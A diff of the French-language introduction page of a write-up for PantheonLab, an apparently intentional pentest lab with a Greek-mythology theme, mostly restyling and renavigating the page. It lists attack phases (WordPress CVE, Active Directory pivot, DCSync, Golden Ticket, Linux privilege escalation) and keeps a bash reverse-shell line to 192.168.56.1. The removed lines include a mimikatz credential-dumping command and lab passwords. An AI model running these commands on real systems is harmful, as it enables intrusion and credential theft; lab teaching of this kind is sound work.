@@ -1,6 +1,6 @@
 
 <!doctype html>
-<html lang="fr" class="no-js">
+<html lang="en" class="no-js">
   <head>
     
       <meta charset="utf-8">
@@ -15,7 +15,7 @@
         <link rel="canonical" href="https://pantheonlab.github.io/writeup/introduction/">
       
       
-        <link rel="prev" href="../../installation/configuration/">
+        <link rel="prev" href="../../installation/quickstart/">
       
       
         <link rel="next" href="../enumeration/">
@@ -47,10 +47,12 @@
         
         
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
-        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Cinzel:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Cinzel";--md-code-font:"Roboto Mono"}</style>
       
     
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/extra.css">
     
     <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
@@ -69,7 +71,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="custom">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -79,7 +81,7 @@
       
         
         <a href="#introduction-au-writeup" class="md-skip">
-          Aller au contenu
+          Skip to content
         </a>
       
     </div>
@@ -91,7 +93,7 @@
       
 
 <header class="md-header" data-md-component="header">
-  <nav class="md-header__inner md-grid" aria-label="En-tête">
+  <nav class="md-header__inner md-grid" aria-label="Header">
     <a href="../.." title="PantheonLab Documentation" class="md-header__button md-logo" aria-label="PantheonLab Documentation" data-md-component="logo">
       
   
@@ -125,7 +127,7 @@
     
     
     
-    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Basculer vers le thème sombre"  type="radio" name="__palette" id="__palette_0">
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="brown" data-md-color-accent="custom"  aria-label="Basculer vers le thème sombre"  type="radio" name="__palette" id="__palette_0">
     
       <label class="md-header__button md-icon" title="Basculer vers le thème sombre" for="__palette_1" hidden>
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
@@ -135,7 +137,7 @@
     
     
     
-    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Basculer vers le thème clair"  type="radio" name="__palette" id="__palette_1">
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="brown" data-md-color-accent="custom"  aria-label="Basculer vers le thème clair"  type="radio" name="__palette" id="__palette_1">
     
       <label class="md-header__button md-icon" title="Basculer vers le thème clair" for="__palette_0" hidden>
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
@@ -160,16 +162,16 @@
   <label class="md-search__overlay" for="__search"></label>
   <div class="md-search__inner" role="search">
     <form class="md-search__form" name="search">
-      <input type="text" class="md-search__input" name="query" aria-label="Rechercher" placeholder="Rechercher" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
       <label class="md-search__icon md-icon" for="__search">
         
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
         
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
       </label>
-      <nav class="md-search__options" aria-label="Recherche">
+      <nav class="md-search__options" aria-label="Search">
         
-        <button type="reset" class="md-search__icon md-icon" title="Effacer" aria-label="Effacer" tabindex="-1">
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
           
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
         </button>
@@ -182,7 +184,7 @@
       <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
         <div class="md-search-result" data-md-component="search-result">
           <div class="md-search-result__meta">
-            Initialisation de la recherche
+            Initializing search
           </div>
           <ol class="md-search-result__list" role="presentation"></ol>
         </div>
@@ -194,7 +196,7 @@
     
     
       <div class="md-header__source">
-        <a href="https://github.com/bbuddha/vulnad" title="Aller au dépôt" class="md-source" data-md-component="source">
+        <a href="https://github.com/0xbbuddha/pantheonlab" title="Go to repository" class="md-source" data-md-component="source">
   <div class="md-source__icon md-icon">
     
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
@@ -215,7 +217,7 @@
         
           
             
-<nav class="md-tabs" aria-label="Onglets" data-md-component="tabs">
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
   <div class="md-grid">
     <ul class="md-tabs__list">
       
@@ -308,7 +310,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../references/commands/" class="md-tabs__link">
+        <a href="../../references/resources/" class="md-tabs__link">
           
   
   
@@ -352,7 +354,7 @@
   </label>
   
     <div class="md-nav__source">
-      <a href="https://github.com/bbuddha/vulnad" title="Aller au dépôt" class="md-source" data-md-component="source">
+      <a href="https://github.com/0xbbuddha/pantheonlab" title="Go to repository" class="md-source" data-md-component="source">
   <div class="md-source__icon md-icon">
     
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
@@ -599,52 +601,6 @@
 
               
             
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../installation/configuration/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Configuration
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../installation/deployment.md" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Déploiement
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
           </ul>
         </nav>
       
@@ -743,7 +699,7 @@
       
         
 
-<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
   
   
   
@@ -752,7 +708,7 @@
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
-      Table des matières
+      Table of contents
     </label>
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
@@ -827,9 +783,18 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#phase-4-persistence-et-privileges" class="md-nav__link">
+  <a href="#phase-4-compromision-du-domaine" class="md-nav__link">
     <span class="md-ellipsis">
-      Phase 4 : Persistence et Privilèges
+      Phase 4 : Compromision du domaine
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-5-escalade-de-privilege-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 5 : Escalade de privilège linux
     </span>
   </a>
   
@@ -925,48 +890,6 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#thematique-mythologique" class="md-nav__link">
-    <span class="md-ellipsis">
-      🎭 Thématique Mythologique
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="🎭 Thématique Mythologique">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#hermes-le-messager" class="md-nav__link">
-    <span class="md-ellipsis">
-      Hermès - Le Messager
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#zeus-le-roi-des-dieux" class="md-nav__link">
-    <span class="md-ellipsis">
-      Zeus - Le Roi des Dieux
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#hera-la-reine-jalouse" class="md-nav__link">
-    <span class="md-ellipsis">
-      Héra - La Reine Jalouse
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#avertissements-importants" class="md-nav__link">
     <span class="md-ellipsis">
       ⚠️ Avertissements Importants
@@ -1027,15 +950,6 @@
   
 </li>
         
-          <li class="md-nav__item">
-  <a href="#outils-et-scripts" class="md-nav__link">
-    <span class="md-ellipsis">
-      Outils et Scripts
-    </span>
-  </a>
-  
-</li>
-        
       </ul>
     </nav>
   
@@ -1080,12 +994,12 @@
   
   
     <li class="md-nav__item">
-      <a href="../exploitation.md" class="md-nav__link">
+      <a href="../foothold_linux/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    Exploitation
+    FootHold_Linux
     
   </span>
   
@@ -1103,12 +1017,12 @@
   
   
     <li class="md-nav__item">
-      <a href="../privesc.md" class="md-nav__link">
+      <a href="../foothold_windows/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    Élévation de privilèges
+    FootHold_Windows
     
   </span>
   
@@ -1126,7 +1040,53 @@
   
   
     <li class="md-nav__item">
-      <a href="../conclusion.md" class="md-nav__link">
+      <a href="../windows_privesc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows_Privesc
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux_privesc_hera/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux_Privesc
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../conclusion/" class="md-nav__link">
         
   
   
@@ -1201,30 +1161,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../references/commands/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Commandes utiles
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../references/resources.md" class="md-nav__link">
+      <a href="../../references/resources/" class="md-nav__link">
         
   
   
@@ -1260,7 +1197,7 @@
                   <div class="md-sidebar__inner">
                     
 
-<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
   
   
   
@@ -1269,7 +1206,7 @@
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
-      Table des matières
+      Table of contents
     </label>
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
@@ -1344,9 +1281,18 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#phase-4-persistence-et-privileges" class="md-nav__link">
+  <a href="#phase-4-compromision-du-domaine" class="md-nav__link">
     <span class="md-ellipsis">
-      Phase 4 : Persistence et Privilèges
+      Phase 4 : Compromision du domaine
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-5-escalade-de-privilege-linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 5 : Escalade de privilège linux
     </span>
   </a>
   
@@ -1442,48 +1388,6 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#thematique-mythologique" class="md-nav__link">
-    <span class="md-ellipsis">
-      🎭 Thématique Mythologique
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="🎭 Thématique Mythologique">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#hermes-le-messager" class="md-nav__link">
-    <span class="md-ellipsis">
-      Hermès - Le Messager
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#zeus-le-roi-des-dieux" class="md-nav__link">
-    <span class="md-ellipsis">
-      Zeus - Le Roi des Dieux
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#hera-la-reine-jalouse" class="md-nav__link">
-    <span class="md-ellipsis">
-      Héra - La Reine Jalouse
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#avertissements-importants" class="md-nav__link">
     <span class="md-ellipsis">
       ⚠️ Avertissements Importants
@@ -1544,15 +1448,6 @@
   
 </li>
         
-          <li class="md-nav__item">
-  <a href="#outils-et-scripts" class="md-nav__link">
-    <span class="md-ellipsis">
-      Outils et Scripts
-    </span>
-  </a>
-  
-</li>
-        
       </ul>
     </nav>
   
@@ -1578,10 +1473,25 @@
 
 
 <h1 id="introduction-au-writeup">Introduction au Writeup</h1>
+<div class="admonition danger">
+<p class="admonition-title">⚠️ Avertissement - Copier n'est pas apprendre</p>
+<p><strong>Ce writeup est fourni à des fins éducatives uniquement !</strong></p>
+<p>🎯 <strong>Recommandation forte</strong> : Essayez d'abord de résoudre le lab par vous-même avant de consulter cette solution.</p>
+<p>📚 <strong>Pourquoi ?</strong> 
+- Les <strong>vraies compétences</strong> se développent en cherchant, en échouant, et en recommençant
+- Copier-coller ne vous apprendra <strong>rien de durable</strong>
+- La <strong>satisfaction</strong> de résoudre un défi par soi-même est incomparable
+- En cybersécurité, <strong>l'adaptabilité</strong> est plus importante que la mémorisation</p>
+<p>🏆 <strong>Rappelez-vous</strong> : Il n'y a aucune récompense à la fin de ce lab, si ce n'est les <strong>compétences et connaissances</strong> que vous aurez acquises. Autant que ce soit par votre propre effort !</p>
+<p>💡 <strong>Utilisez ce writeup comme</strong> :
+- Une <strong>validation</strong> de votre approche après avoir trouvé
+- Une <strong>aide</strong> quand vous êtes vraiment bloqué (eviter cette page car elle résumer beaucoup de choses simultanément.)
+- Une <strong>source d'apprentissage</strong> pour comprendre les techniques</p>
+</div>
 <h2 id="objectif-du-lab">🎯 Objectif du Lab</h2>
-<p>Ce writeup détaille la résolution complète du lab PantheonLab, un environnement de pentest inspiré de la mythologie grecque. L'objectif est de démontrer une méthodologie complète d'audit de sécurité, de l'énumération initiale jusqu'à l'obtention des privilèges administrateur.</p>
+<p>Ce writeup détaille la résolution complète du lab PantheonLab, un environnement de pentest inspiré de la mythologie grecque. L'objectif est de démontrer une méthodologie complète d'audit de sécurité, de l'énumération initiale jusqu'à l'obtention des privilèges administrateur sur toutes les machines.</p>
 <h2 id="contexte-du-scenario">🏛️ Contexte du Scénario</h2>
-<p>Dans l'univers de PantheonLab, les dieux de l'Olympe ont modernisé leur royaume en adoptant les technologies numériques. Cependant, cette transition a introduit des vulnérabilités que nous devons identifier et exploiter pour sécuriser le Panthéon numérique.</p>
+<p>Dans l'univers de PantheonLab, les dieux de l'Olympe ont décidé de mettre en place des jeux afin de permettre à un mortel de se hisser au-dessus des autres et de les rejoindre au Panthéon. Cependant, un dieu, Hermès, s'agace dans l'ombre de n'être que le messager. Il a introduit des vulnérabilités pour s'approcher discrètement des dieux — des vulnérabilités que vous devrez identifier et exploiter, vous devrez ensuite vous débrouiller afin de compromettre entièrement cet environnement.</p>
 <h3 id="machines-cibles">Machines Cibles</h3>
 <table>
 <thead>
@@ -1589,7 +1499,6 @@
 <th>Machine</th>
 <th>IP</th>
 <th>Rôle</th>
-<th>Point d'Entrée</th>
 </tr>
 </thead>
 <tbody>
@@ -1597,19 +1506,16 @@
 <td><strong>Olympe</strong></td>
 <td>192.168.56.10</td>
 <td>Serveur Linux/WordPress</td>
-<td>✅ Principal</td>
 </tr>
 <tr>
 <td><strong>DC01</strong></td>
 <td>192.168.56.11</td>
 <td>Contrôleur de domaine</td>
-<td>🔒 Objectif final</td>
 </tr>
 <tr>
 <td><strong>Enfers</strong></td>
 <td>192.168.56.12</td>
 <td>Serveur membre</td>
-<td>🔒 Lateral movement</td>
 </tr>
 </tbody>
 </table>
@@ -1622,44 +1528,56 @@
 </ul>
 <h3 id="phase-2-exploitation-initiale">Phase 2 : Exploitation Initiale</h3>
 <ul>
-<li><strong>Exploitation WordPress</strong> : Bypass d'authentification</li>
+<li><strong>Exploitation WordPress</strong> : Exploitation de CVE</li>
 <li><strong>Obtenir un shell</strong> : Accès initial sur Olympe</li>
-<li><strong>Élévation de privilèges</strong> : Accès utilisateur hermes</li>
+<li><strong>Élévation de privilèges</strong> : Accès à utilisateur hermes</li>
 </ul>
 <h3 id="phase-3-lateral-movement">Phase 3 : Lateral Movement</h3>
 <ul>
 <li><strong>Énumération Active Directory</strong> : Découverte du domaine</li>
 <li><strong>Exploitation des credentials</strong> : Utilisation des comptes trouvés</li>
-<li><strong>Accès aux machines Windows</strong> : Pivot vers DC01 et Enfers</li>
+<li><strong>Accès aux machines Windows</strong> : Pivot vers DC01 </li>
 </ul>
-<h3 id="phase-4-persistence-et-privileges">Phase 4 : Persistence et Privilèges</h3>
+<h3 id="phase-4-compromision-du-domaine">Phase 4 : Compromision du domaine</h3>
 <ul>
 <li><strong>Escalade de privilèges</strong> : Obtenir l'accès administrateur</li>
-<li><strong>DCSync</strong> : Extraction des hashes du domaine</li>
+<li><strong>Accès aux machines Windows</strong> : Pivot vers ENFERS </li>
 <li><strong>Golden Ticket</strong> : Contrôle total du domaine</li>
+<li><strong>DCSync</strong> : Extraction des hashes du domaine</li>
+</ul>
+<h3 id="phase-5-escalade-de-privilege-linux">Phase 5 : Escalade de privilège linux</h3>
+<ul>
+<li><strong>Password Reused</strong> : Connexion en tant que hera sur la machine linux</li>
+<li><strong>Exploitation</strong> : Insecure cron jobs</li>
+<li><strong>Escalade de privilèges</strong> : Obtenir l'accès root</li>
 </ul>
 <h2 id="outils-utilises">🛠️ Outils Utilisés</h2>
 <h3 id="enumeration">Énumération</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Réseau</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span><span class="m">192</span>.168.56.10
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># Web</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://192.168.56.10<span class="w"> </span>--plugins-detection<span class="w"> </span>aggressive
-<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://192.168.56.10<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/common.txt
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
-<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="c1"># Active Directory</span>
-<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.56.11<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>--shares
-<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>bloodhound-python<span class="w"> </span>-d<span class="w"> </span>pantheon.god<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-c<span class="w"> </span>All
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>nmap<span class="w"> </span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>netexec<span class="o">||</span>nxc
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="c1"># Web</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>wpscan<span class="w"> </span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>gobuster
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="c1"># Active Directory</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>netexec<span class="o">||</span>nxc
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>rusthound
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>bloodhound
 </code></pre></div>
 <h3 id="exploitation">Exploitation</h3>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># WordPress</span>
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>python3<span class="w"> </span>CVE-2025-32118.py<span class="w"> </span>-u<span class="w"> </span>http://192.168.56.10<span class="w"> </span>-un<span class="w"> </span>hermes<span class="w"> </span>-p<span class="w"> </span>mondieu
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>CVE-2025-32118.py
 <a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
 <a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># Reverse Shell</span>
 <a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9001 0&gt;&amp;1&#39;</span>
 <a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
 <a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="c1"># Active Directory</span>
-<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>mimikatz.exe<span class="w"> </span><span class="s2">&quot;privilege::debug&quot;</span><span class="w"> </span><span class="s2">&quot;sekurlsa::logonpasswords&quot;</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>mimikatz.exe
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>rubeus.exe
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>SharpSuccessor.exe
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>GMSAPasswordReader.exe
 </code></pre></div>
 <h2 id="progression-attendue">📊 Progression Attendue</h2>
 <h3 id="niveau-1-acces-initial">Niveau 1 : Accès Initial</h3>
@@ -1677,35 +1595,16 @@
 </ul>
 <h3 id="niveau-3-lateral-movement">Niveau 3 : Lateral Movement</h3>
 <ul class="task-list">
-<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Énumération complète du domaine</li>
-<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Découverte des utilisateurs et groupes</li>
-<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Exploitation des vulnérabilités Kerberos</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Énumération complète du domaine</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Découverte des utilisateurs et groupes</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Exploitation des vulnérabilités Kerberos</li>
 </ul>
 <h3 id="niveau-4-controle-total">Niveau 4 : Contrôle Total</h3>
 <ul class="task-list">
-<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Escalade vers administrateur</li>
-<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> DCSync du domaine</li>
-<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> Création de Golden Ticket</li>
-</ul>
-<h2 id="thematique-mythologique">🎭 Thématique Mythologique</h2>
-<p>Chaque étape du writeup correspond à une rencontre avec les dieux de l'Olympe :</p>
-<h3 id="hermes-le-messager">Hermès - Le Messager</h3>
-<ul>
-<li><strong>Vulnérabilité</strong> : Credentials faibles (hermes:y)</li>
-<li><strong>Scénario</strong> : Intercepter les messages divins</li>
-<li><strong>Technique</strong> : Brute force, exploitation WordPress</li>
-</ul>
-<h3 id="zeus-le-roi-des-dieux">Zeus - Le Roi des Dieux</h3>
-<ul>
-<li><strong>Vulnérabilité</strong> : Contrôleur de domaine</li>
-<li><strong>Scénario</strong> : Détrôner le roi de l'Olympe</li>
-<li><strong>Technique</strong> : DCSync, Golden Ticket</li>
-</ul>
-<h3 id="hera-la-reine-jalouse">Héra - La Reine Jalouse</h3>
-<ul>
-<li><strong>Vulnérabilité</strong> : Politiques de sécurité</li>
-<li><strong>Scénario</strong> : Contourner la surveillance divine</li>
-<li><strong>Technique</strong> : Bypass des politiques, audit evasion</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Escalade vers administrateur</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Création de Golden Ticket</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> DCSync du domaine</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> Privesc Linux</li>
 </ul>
 <h2 id="avertissements-importants">⚠️ Avertissements Importants</h2>
 <div class="admonition warning">
@@ -1741,15 +1640,12 @@
 <li><a href="https://owasp.org/www-project-web-security-testing-guide/">OWASP Testing Guide</a></li>
 <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-active-directory">HackTricks Active Directory</a></li>
 <li><a href="https://bloodhound.readthedocs.io/">BloodHound Documentation</a></li>
-</ul>
-<h3 id="outils-et-scripts">Outils et Scripts</h3>
-<ul>
-<li><a href="https://github.com/PowerShellMafia/PowerSploit">PowerView</a></li>
-<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li>
-<li><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></li>
